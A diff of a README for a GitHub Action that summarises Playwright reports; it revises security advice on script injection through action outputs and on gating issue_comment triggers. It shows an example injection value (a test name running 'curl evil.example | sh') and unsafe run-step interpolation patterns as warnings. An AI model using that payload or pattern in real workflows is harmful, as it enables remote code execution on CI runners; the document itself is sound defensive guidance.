@@ -147,21 +147,22 @@ The raw data of the test report, as a JSON-encoded string. This is useful for cr
 You can get an idea of the data structure by checking out the
 [ReportSummary interface](https://github.com/daun/playwright-report-summary/blob/main/src/report.ts#L13).
 
-## Security: using outputs safely
+## Security
 
-The `summary` and `report-data` outputs contain strings derived from the Playwright JSON report — including
-test titles, file paths, error messages and stack traces. When tests are produced from pull-request code
-(for example in a `pull_request_target` workflow, or via a `workflow_run` that downloads a report artifact
-from a fork PR), **those strings are attacker-controlled**.
+The action sanitizes its rendered comment so that untrusted content cannot inject active markdown. However,
+if you are passing the action's outputs to another action or triggering the action in a non-PR context, make sure
+to read the next section to harden your workflows against script injection.
 
-The action sanitizes its rendered comment so that untrusted content cannot inject active markdown.
-However, the `summary` and `report-data` outputs are deliberately raw so you can post-process them.
-GitHub Actions interpolates output values **literally, before the shell parses the command**, so passing
-them into a `run:` step can lead to script injection on the runner.
+### Using outputs safely
 
-### ✅ Safe patterns
+The `summary` and `report-data` outputs contain raw test titles and file paths from the Playwright JSON report for
+you to post-process. When tests are added from external pull requests, **those strings are attacker-controlled**.
+Since GitHub Actions output values are **interpolated literally before shell parsing**, passing them into a `run:`
+step can lead to script injection on the runner.
 
-Pass outputs as **inputs to another action**. Action inputs are not shell-interpreted.
+#### ![check](https://icongr.am/octicons/shield-check.svg?size=12&color=abb4bf) Safe patterns
+
+Pass outputs as inputs to another action. Action inputs are not shell-interpreted.
 
 ```yaml
 - uses: daun/playwright-report-summary@v4
@@ -172,7 +173,8 @@ Pass outputs as **inputs to another action**. Action inputs are not shell-interp
 
 - uses: marocchino/sticky-pull-request-comment@v3
   with:
-    message: ${{ steps.summary.outputs.summary }}   # safe: action input
+    # safe: action input, not shell-interpolated
+    message: ${{ steps.summary.outputs.summary }}
 ```
 
 If you need an output inside a `run:` step, pass it through an **environment variable** and quote the
@@ -182,63 +184,48 @@ shell expansion. The value never touches the shell parser.
 - run: |
     echo "$SUMMARY" >> notes.md
   env:
-    SUMMARY: ${{ steps.summary.outputs.summary }}    # safe: env var, quoted
+    # safe: quoted env var, not shell-interpolated
+    SUMMARY: ${{ steps.summary.outputs.summary }}
 ```
 
-### ⚠️ Unsafe patterns
+#### ![check](https://icongr.am/octicons/shield.svg?size=12&color=abb4bf) Unsafe patterns
 
-Do **not** interpolate `summary` or `report-data` directly into a `run:` script:
+Do **not** interpolate outputs directly into a `run:` script. A test named `` `; curl evil.example | sh; # ``
+would execute on your runner.
 
 ```yaml
-- run: echo "${{ steps.summary.outputs.summary }}"        # UNSAFE
-- run: curl -d "${{ steps.summary.outputs.report-data }}" \  # UNSAFE
-        https://example.com
+# UNSAFE: output is interpolated and open to injection
+- run: echo "${{ steps.summary.outputs.summary }}"
+- run: curl -d "${{ steps.summary.outputs.report-data }}" https://example.com
 ```
-
-A test named `` `; curl evil.example | sh; # `` would execute on your runner.
 
 See GitHub's guidance on
-[understanding the risk of script injections](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
+[mitigating script injection attacks](https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks)
 for more.
 
-## Security: triggering from `issue_comment`
+### Triggering from `issue_comment`
 
-The action supports being run from an `issue_comment` event so you can, for example, re-post the summary
-when someone comments `/retest` on a PR. **Be aware that in a public repository any GitHub user can
-comment on a PR**, so an unguarded `issue_comment` workflow lets arbitrary users trigger the action
-(and consume your minutes, and cause `github-actions[bot]` to post a comment in response to their input).
-
-If you wire the action to `issue_comment`, gate the job on the commenter's association with the
-repository. Examples:
+The action supports being run from an `issue_comment` event so you can e.g. re-post the summary
+when someone comments `/retest` on a PR. **In a public repository any GitHub user can
+comment on a PR**, so you need to make sure the job is gated on the commenter's association with the
+repository to avoid potential abuse.
 
 ```yaml
-on: issue_comment
-
+# Only run for comments by users with write+ access
 jobs:
   summary:
-    # Only run for comments authored by users with write access or above.
-    if: >-
-      github.event.issue.pull_request &&
-      contains(fromJSON('["OWNER", "MEMBER", "COLLABORATOR"]'),
-               github.event.comment.author_association)
-    runs-on: ubuntu-latest
-    steps:
-      - uses: daun/playwright-report-summary@v4
-        with:
-          report-file: results.json
-```
+    if: github.event.issue.pull_request && contains(fromJSON('["OWNER", "MEMBER", "COLLABORATOR"]'), github.event.comment.author_association)
 
-Or restrict to an explicit actor allowlist:
-
-```yaml
+# Or restrict to an explicit actor allowlist
+jobs:
+  summary:
     if: github.event.issue.pull_request && github.actor == 'your-bot-user'
 ```
 
 If your `issue_comment` job additionally **checks out the PR head** (e.g. to re-run tests), the same
 threat model as `pull_request_target` applies: treat the checked-out code as untrusted and never run it
-with repository secrets in scope. See GitHub's
-[keeping your GitHub Actions and workflows secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
-for background.
+with repository secrets in scope. See the official guidance on
+[keeping your GitHub actions secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) for details.
 
 ## License
 
